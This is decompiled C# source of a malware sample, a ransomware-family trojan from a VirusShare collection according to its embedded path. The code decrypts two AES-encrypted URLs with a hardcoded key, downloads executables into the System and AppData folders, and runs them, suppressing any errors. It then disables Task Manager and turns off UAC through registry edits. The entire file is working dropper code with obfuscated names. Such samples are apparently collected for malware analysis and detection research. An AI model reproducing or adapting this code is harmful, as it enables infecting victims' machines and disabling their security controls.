// Decompiled with JetBrains decompiler
// Type: ƥƙǭÈPgƪlȣmQsqU
// Assembly: may, Version=8.80.38.55, Culture=neutral, PublicKeyToken=null
// MVID: CF0014FE-579F-4D82-87C4-FDC6C2EF98B8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Foreign.uub-636524abc76b13574a994fb7f7a74b5ee5775fc18e0be959e39a2dddd6cec802.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;

internal static class ƥƙǭÈPgƪlȣmQsqU
{
  public static void Main()
  {
    try
    {
      string fileName = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Path.GetFileNameWithoutExtension(Path.GetTempFileName()) + ".exe";
      new WebClient().DownloadFile(ƥƙǭÈPgƪlȣmQsqU.xփƁQÀƙuǍƂm("vn/9Zri3aj4c4amDn2GqlWpFrgMH0UXlkOeX03zIc5dQkZdf16ypPkxCBxXlSNCn"), fileName);
      Process.Start(fileName);
    }
    catch
    {
    }
    try
    {
      string fileName = Environment.ExpandEnvironmentVariables("%AppData%") + "\\" + Path.GetFileNameWithoutExtension(Path.GetTempFileName()) + ".exe";
      new WebClient().DownloadFile(ƥƙǭÈPgƪlȣmQsqU.xփƁQÀƙuǍƂm("vn/9Zri3aj4c4amDn2GqlWpFrgMH0UXlkOeX03zIc5dxfAMrzeauK3A1HX9HppQd"), fileName);
      Process.Start(fileName);
    }
    catch
    {
    }
    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("EnableLUA", (object) "0", RegistryValueKind.DWord);
  }

  private static string xփƁQÀƙuǍƂm(string ƋƀUdCƾƉƐcƊփSǭơ)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
    byte[] destinationArray = new byte[32];
    byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes("acHuFsIZSD"));
    Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
    Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
    rijndaelManaged.Key = destinationArray;
    rijndaelManaged.Mode = CipherMode.ECB;
    ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
    byte[] inputBuffer = Convert.FromBase64String(ƋƀUdCƾƉƐcƊփSǭơ);
    return Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
  }
}
